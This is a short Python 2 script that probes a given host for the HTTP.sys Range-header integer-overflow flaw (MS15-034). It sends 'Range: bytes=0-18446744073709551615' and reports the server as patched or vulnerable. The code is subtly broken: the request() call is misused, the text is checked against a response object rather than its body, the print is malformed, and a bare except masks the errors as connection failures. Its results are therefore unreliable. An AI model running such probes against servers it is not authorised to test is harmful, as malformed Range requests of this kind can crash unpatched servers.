import sys,socket,httplib
host = sys.argv[1]
port = int(sys.argv[2])
url = str(host)+":"+str(port)
try:
    c = httplib.HTTPConnection(url,timeout=10)
    c.request ("GET / HTTP/1.1\r\nHost: ghost\r\nRange: bytes=0-18446744073709551615\r\n\r\n")
    r2 = c.getresponse()
    
    if "Requested Range Not Satisfiable" not in r2:
        print "The servers seems to be patched !!!"
    else:
        print "The server seems to be vulnerable \n\nRespose is: %s", r2
    print "\n\n"
except :
    print "Unable to connect !!!"
